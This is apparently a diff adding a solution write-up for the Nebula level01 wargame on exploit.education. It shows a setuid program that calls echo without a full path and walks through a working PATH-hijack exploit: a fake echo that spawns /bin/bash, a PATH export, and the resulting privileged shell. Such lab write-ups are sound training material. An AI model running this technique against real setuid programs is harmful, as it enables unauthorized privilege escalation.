@@ -1,0 +1,61 @@
+Question URL: https://exploit.education/nebula/level-01/
+
+Source Code:
+
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+int main(int argc, char **argv, char **envp)
+{
+  gid_t gid;
+  uid_t uid;
+  gid = getegid();
+  uid = geteuid();
+
+  setresgid(gid, gid, gid);
+  setresuid(uid, uid, uid);
+
+  # Vulnerable code. env calls echo command without full path where is located /bin/echo
+  system("/usr/bin/env echo and now what?");  
+}
+
+Background Knowledge:
+a. /usr/bin/env
+ - "env" runs a program in a modified environment
+b. env syntax fomat
+- env [option] ... [-] [NAME=VALUE] ... [COMMAND [ARG]...]
+  : Set each NAME to VALUE in the environment and run COMMAND
+c. Vulnerable program is set with setuid
+level01@nebula:/home/flag01$  ls -al /home/flag01/flag01
+-rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 /home/flag01/flag01
+
+
+Sol.
+- In the vulnerable code, env is calling echo command. However its full path is not specified, 
+the vulnerable code can also call any echo command which is in path.
+
+1. Build custom echo program calling /bin/bash and comple it
+#include <stdio.h>
+#include <unistd.h>
+
+int main(){
+  system("/bin/bash");
+}
+
+level01@nebula:~$  gcc -o echo echo.c
+level01@nebula:~$ ls -al echo*
+-rwxrwxr-x 1 level01 level01 7236 2019-02-07 03:47 echo
+-rw-rw-r-- 1 level01 level01  122 2019-02-07 03:01 echo.c
+
+2. Add the custum echo program into the path
+level01@nebula:/home/flag01$ export PATH=/home/level01:$PATH
+
+3. Run the vulnerable code
+level01@nebula:~$ /home/flag01/flag01
+flag01@nebula:~$ id
+uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)
+
+
